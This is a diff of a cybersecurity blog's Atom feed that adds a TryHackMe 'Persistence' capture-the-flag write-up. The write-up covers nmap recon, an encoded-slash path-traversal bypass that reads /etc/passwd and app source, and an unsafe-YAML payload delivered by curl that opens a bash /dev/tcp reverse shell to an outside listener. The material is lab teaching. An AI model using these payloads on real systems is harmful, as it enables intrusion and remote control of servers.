@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-28T14:16:03-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Brr v1 Tryhackme</title><link href="http://localhost:4000/blog/Brrv1Tryhackme/" rel="alternate" type="text/html" title="Brr v1 Tryhackme" /><published>2025-06-28T00:00:00-04:00</published><updated>2025-06-28T00:00:00-04:00</updated><id>http://localhost:4000/blog/%20BrrV1</id><content type="html" xml:base="http://localhost:4000/blog/Brrv1Tryhackme/"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-28T18:03:46-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Brr v1 Tryhackme</title><link href="http://localhost:4000/blog/Brrv1Tryhackme/" rel="alternate" type="text/html" title="Brr v1 Tryhackme" /><published>2025-06-28T00:00:00-04:00</published><updated>2025-06-28T00:00:00-04:00</updated><id>http://localhost:4000/blog/%20BrrV1</id><content type="html" xml:base="http://localhost:4000/blog/Brrv1Tryhackme/"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
   <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
     Challenge: Brr v1
   </div>
@@ -244,7 +244,453 @@ cat root.txt
   <li>ScadaBR vulnerability exploitation</li>
   <li>Reverse shell payload delivery</li>
   <li>Direct privilege escalation to root access</li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: Brr v1 Description: A forgotten HMI node deep in Virelia’s wastewater control loop still runs an outdated instance, forked from an old Mango M2M stack.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://img.freepik.com/premium-photo/serene-eerie-depiction-dark-throne-room-with-red-flames_908344-67404.jpg" /><media:content medium="image" url="https://img.freepik.com/premium-photo/serene-eerie-depiction-dark-throne-room-with-red-flames_908344-67404.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Breach Tryhackme</title><link href="http://localhost:4000/blog/BreachTryhackme/" rel="alternate" type="text/html" title="Breach Tryhackme" /><published>2025-06-27T00:00:00-04:00</published><updated>2025-06-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/Breach</id><content type="html" xml:base="http://localhost:4000/blog/BreachTryhackme/"><![CDATA[<h2 id="initial-recon-nmap-full-port-and-version-scan">Initial Recon: Nmap Full Port and Version Scan</h2>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: Brr v1 Description: A forgotten HMI node deep in Virelia’s wastewater control loop still runs an outdated instance, forked from an old Mango M2M stack.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://img.freepik.com/premium-photo/serene-eerie-depiction-dark-throne-room-with-red-flames_908344-67404.jpg" /><media:content medium="image" url="https://img.freepik.com/premium-photo/serene-eerie-depiction-dark-throne-room-with-red-flames_908344-67404.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Persistence Tryhackme</title><link href="http://localhost:4000/blog/PersistenceTryhackme/" rel="alternate" type="text/html" title="Persistence Tryhackme" /><published>2025-06-28T00:00:00-04:00</published><updated>2025-06-28T00:00:00-04:00</updated><id>http://localhost:4000/blog/Persistence</id><content type="html" xml:base="http://localhost:4000/blog/PersistenceTryhackme/"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
+  <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
+    Challenge: Persistence
+  </div>
+  <div style="margin-bottom: 12px;">
+    <strong>Description:</strong><br />
+    After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.
+
+As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated.<br />
+  </div>
+</div>
+
+<h3 id="initial-recon-nmap-sweep">Initial Recon: Nmap Sweep</h3>
+<p>We begin with a basic Nmap scan to surface any open services:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+nmap -sV -p- 10.10.75.44
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*_7ciOXzoVymtdZua4LaQjw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><strong>Findings</strong>:</p>
+
+<ul>
+  <li>
+    <p>Port 22 – OpenSSH</p>
+  </li>
+  <li>
+    <p>Port 80 – HTTP (redirects to 8080)</p>
+  </li>
+  <li>
+    <p>Port 8080 – Custom Web HMI portal</p>
+  </li>
+</ul>
+
+<p>Navigating to <code class="language-plaintext highlighter-rouge">http://10.10.75.44:8080</code> reveals a fairly minimal HTML interface called <strong>HMI Dashboard</strong>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NUVDVXGc7fRJQ9rLCyVnnA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h3 id="web-enumeration--source-analysis">Web Enumeration &amp; Source Analysis</h3>
+
+<p>The homepage lists a few key paths:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/dashboard</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/telemetry</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/logs/view?name=debug.log</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/config/update</code></p>
+  </li>
+</ul>
+
+<p>We go straight to <code class="language-plaintext highlighter-rouge">debug.log</code> and find juicy internal debug info:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+STARTUP CONFIG: {'SIGNATURE': 'secr3tFTW192d2390', 'PLCS': [...], 'SENSORS': [...]}
+DEBUG: loader script at /opt/hmi/update.py
+DEBUG: webapp script at /opt/hmi/app.py
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NKTpDKWmYDmeY8Dv950e6A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>That <code class="language-plaintext highlighter-rouge">SIGNATURE</code> value feels special. We store it.</p>
+
+<h3 id="config-upload-endpoint-analysis">Config Upload Endpoint Analysis</h3>
+
+<p>Next, we investigate the <code class="language-plaintext highlighter-rouge">/config/update</code> endpoint which appears to accept YAML file uploads. This looks promising for potential configuration manipulation.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+SIGNATURE: secr3tFTW192d2390
+PLCS:
+  - id: PLC-101
+    ip: 192.168.10.11
+  - id: PLC-102
+    ip: 192.168.10.12
+SENSORS:
+  - name: FlowRate
+    unit: L/s
+  - name: Pressure
+    unit: bar
+</code></pre>
+</div>
+
+<p>Using the signature key <code class="language-plaintext highlighter-rouge">secr3tFTW192d2390</code> we discovered earlier, I attempted various approaches to authenticate the upload:</p>
+
+<ol>
+  <li><strong>YAML Content Authentication</strong> - Embedding the signature within the YAML file</li>
+  <li><strong>HTTP Header Authentication</strong> - Sending the signature via custom headers like <code class="language-plaintext highlighter-rouge">X-Signature</code> or <code class="language-plaintext highlighter-rouge">Authorization</code></li>
+  <li><strong>Form Data Authentication</strong> - Including the signature as additional form parameters</li>
+</ol>
+
+<p>Unfortunately, all attempts resulted in <strong>403 Forbidden</strong> responses, indicating that simply having the signature key isn’t sufficient for authentication. The endpoint appears to have additional security measures or a different authentication mechanism that we haven’t uncovered yet.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*YT7FsR5nV7CNpTgvnezheg.png" alt="403 Forbidden Response" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>This suggests we need to dig deeper into the application’s authentication logic or find alternative attack vectors.</p>
+
+<h3 id="local-file-inclusion-discovery">Local File Inclusion Discovery</h3>
+
+<p>With the config upload endpoint blocked, I shifted focus back to the logs endpoint for parameter enumeration. I started with directory fuzzing using ffuf:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+ffuf -u "http://10.10.75.44:8080/logs/view?name=FUZZ.log" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200
+</code></pre>
+</div>
+
+<p>The fuzzing didn’t reveal additional log files, so I pivoted to testing for Local File Inclusion (LFI). Standard path traversal payloads like <code class="language-plaintext highlighter-rouge">../../../../../etc/passwd</code> were blocked, but the application’s error messages revealed crucial information about its filtering logic.</p>
+
+<h4 id="error-message-analysis---the-key-to-understanding-filters">Error Message Analysis - The Key to Understanding Filters</h4>
+
+<p>Testing different payloads exposed interesting behavioral differences in the application’s responses:</p>
+
+<p><strong>Test Case 1:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+/logs/view?name=app.py -&gt; "log not found"
+</code></pre>
+</div>
+
+<p><strong>Test Case 2:</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+/logs/view?name=../../../../update.py -&gt; "no logs found"
+</code></pre>
+</div>
+
+<p>This isn’t just a difference in wording it reveals the underlying application logic:</p>
+
+<ul>
+  <li>
+    <p><strong>“log not found”</strong> indicates the application looked for <code class="language-plaintext highlighter-rouge">app.py</code> in the legitimate logs directory but couldn’t find it. The filename format was accepted as valid.</p>
+  </li>
+  <li>
+    <p><strong>“no logs found”</strong> indicates the path traversal attempt was detected and blocked/sanitized before file system access was attempted.</p>
+  </li>
+</ul>
+
+<h4 id="url-encoding-bypass">URL Encoding Bypass</h4>
+
+<p>Based on this analysis, I suspected the application was filtering forward slashes (<code class="language-plaintext highlighter-rouge">/</code>) in the path traversal. Testing with URL-encoded slashes (<code class="language-plaintext highlighter-rouge">%2f</code>) confirmed this theory:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+curl "http://10.10.75.44:8080/logs/view?name=../../../../../etc/passwd"
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*sKaBlbeGO0yh6tIb6b059A.png" alt="403 Forbidden Response" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+curl "http://10.10.75.44:8080/logs/view?name=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FjrjdYnUUbnB6C5DgpK93Q.png" alt="403 Forbidden Response" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Success! The URL encoding bypass allowed me to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, confirming LFI vulnerability.</p>
+
+<h3 id="source-code-analysis">Source Code Analysis</h3>
+
+<p>Now that we have confirmed LFI, let’s examine the application’s source code. Remember from the debug logs, we identified two critical files:</p>
+
+<ul>
+  <li><strong>Loader script</strong>: <code class="language-plaintext highlighter-rouge">/opt/hmi/update.py</code></li>
+  <li><strong>Web application</strong>: <code class="language-plaintext highlighter-rouge">/opt/hmi/app.py</code></li>
+</ul>
+
+<p>Using our URL encoding bypass technique, let’s retrieve these files:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+# Read the update.py loader script
+curl "http://10.10.75.44:8080/logs/view?name=..%2f..%2f..%2f..%2f..%2fopt%2fhmi%2fupdate.py"
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*obt4HhdEjFT8d4oKqyz3WA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+# Read the app.py web application
+curl "http://10.10.75.44:8080/logs/view?name=..%2f..%2f..%2f..%2f..%2fopt%2fhmi%2fapp.py"
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*gXsmdikDIC3_vYtuVhodtQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h2 id="key-juicy-bits">Key juicy bits:</h2>
+
+<h3 id="1-signature-check-on-post-configupdate">1. <strong>Signature check on POST /config/update</strong></h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+sig = request.headers.get('X-FTW','')
+if sig != app_config['SIGNATURE']:
+    return 'Forbidden', 403
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p>Your POST to <code class="language-plaintext highlighter-rouge">/config/update</code> <strong>must include header <code class="language-plaintext highlighter-rouge">X-FTW</code> with the exact signature</strong> from the config (like <code class="language-plaintext highlighter-rouge">secr3tFTW192d2390</code>)</p>
+  </li>
+  <li>
+    <p>If it doesn’t match, server spits <code class="language-plaintext highlighter-rouge">403 Forbidden</code></p>
+  </li>
+</ul>
+
+<h3 id="2-content-type-must-be-exactly-applicationx-yaml">2. <strong>Content-Type must be exactly <code class="language-plaintext highlighter-rouge">application/x-yaml</code></strong></h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+if request.content_type != 'application/x-yaml':
+    return 'Unsupported Media Type', 415
+</code></pre>
+</div>
+
+<ul>
+  <li>Your POST must send the YAML <strong>with header <code class="language-plaintext highlighter-rouge">Content-Type: application/x-yaml</code></strong> (not <code class="language-plaintext highlighter-rouge">application/x-www-form-urlencoded</code> or anything else)</li>
+</ul>
+
+<h3 id="3-config-writing-and-update-trigger">3. <strong>Config writing and update trigger</strong></h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+with open(os.path.join(APP_ROOT, 'config.yaml'), 'wb') as f:
+    f.write(data)
+log('Configuration updated', 'app')
+subprocess.Popen(['sudo', 'python3', os.path.join(APP_ROOT, 'update.py')])
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p>The server overwrites <code class="language-plaintext highlighter-rouge">/opt/hmi/config.yaml</code> with your raw YAML data (no sanitizing!)</p>
+  </li>
+  <li>
+    <p>Then asynchronously runs <code class="language-plaintext highlighter-rouge">sudo python3 /opt/hmi/update.py</code> so your malicious YAML can trigger code execution through the <code class="language-plaintext highlighter-rouge">UnsafeLoader</code> you saw earlier!</p>
+  </li>
+</ul>
+
+<h3 id="4-log-viewing-endpoint-logsview">4. <strong>Log viewing endpoint <code class="language-plaintext highlighter-rouge">/logs/view</code></strong></h3>
+
+<ul>
+  <li>
+    <p>Blocks <code class="language-plaintext highlighter-rouge">/</code> in query string to stop traversal</p>
+  </li>
+  <li>
+    <p>Reads logs only inside <code class="language-plaintext highlighter-rouge">/opt/hmi/logs</code></p>
+  </li>
+  <li>
+    <p>If file missing or filtered, returns errors</p>
+  </li>
+</ul>
+
+<p>Now with all this information, we can start to write our YAML that would let us get a reverse shell. In this case, my YAML looks like this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+cat exploit.yaml
+SIGNATURE: secr3tFTW192d2390
+PLCS:
+  - id: PLC-101
+    ip: 192.168.10.11
+  - id: PLC-102
+    ip: 192.168.10.12
+SENSORS:
+  - name: FlowRate
+    unit: L/s
+  - name: Pressure
+    unit: bar
+BACKDOOR:
+  enabled: true
+  commands:
+    - !!python/object/apply:os.system
+      - "bash -c 'bash -i &gt;&amp; /dev/tcp/10.13.87.60/4444 0&gt;&amp;1'"
+</code></pre>
+</div>
+
+<p>And for sending the payload, I would send it like this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+curl -X POST http://10.10.75.44:8080/config/update \                         
+  -H "X-FTW: secr3tFTW192d2390" \
+  -H "Content-Type: application/x-yaml" \
+  --data-binary @exploit.yaml
+</code></pre>
+</div>
+
+<p>Remember to set up your listener:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+nc -lvnp 4444
+
+listening on [any] 4444 ...
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yYB6ZYvNU06Gr8Y_W_70Lg.png" alt="Reverse Shell Success" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*TZKx8bUQmCPtbnFwdKQdhQ.png" alt="Reverse Shell Success" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>We got a reverse shell! Ladies and gentlemen, we’re in!</p>
+
+<p>Now to find the flag, we execute this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+grep -r --color=always 'THM{' /opt /home /tmp /var /etc 2&gt;/dev/null
+</code></pre>
+</div>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: Persistence Description: After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://t3.ftcdn.net/jpg/12/35/16/60/360_F_1235166046_hwjPQ4tazm67h8oblqp2Ec9UtDdUguas.jpg" /><media:content medium="image" url="https://t3.ftcdn.net/jpg/12/35/16/60/360_F_1235166046_hwjPQ4tazm67h8oblqp2Ec9UtDdUguas.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Breach Tryhackme</title><link href="http://localhost:4000/blog/BreachTryhackme/" rel="alternate" type="text/html" title="Breach Tryhackme" /><published>2025-06-27T00:00:00-04:00</published><updated>2025-06-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/Breach</id><content type="html" xml:base="http://localhost:4000/blog/BreachTryhackme/"><![CDATA[<h2 id="initial-recon-nmap-full-port-and-version-scan">Initial Recon: Nmap Full Port and Version Scan</h2>
 
 <div class="code-block-container">
   <span class="code-lang-tag">Terminal</span>
@@ -3264,3068 +3710,4 @@ http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(
   <li>
     <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
   </li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks. That’s the threat behind Command Injection one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-08T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html"><![CDATA[<h1 id="sql-structured-query-language">SQL (Structured Query Language)</h1>
-<p>SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called <strong>statements</strong>.</p>
-
-<p>In this guide, we’ll stick with <strong>MySQL-style syntax</strong>. It’s important to know SQL is <strong>not case-sensitive</strong>, so commands like <code class="language-plaintext highlighter-rouge">SELECT</code>, <code class="language-plaintext highlighter-rouge">select</code>, and <code class="language-plaintext highlighter-rouge">SeLeCt</code> all behave the same.</p>
-
-<hr />
-
-<h2 id="select--retrieving-data"><strong>SELECT – Retrieving Data</strong></h2>
-
-<p>Let’s say we have a table named <code class="language-plaintext highlighter-rouge">books</code>.</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
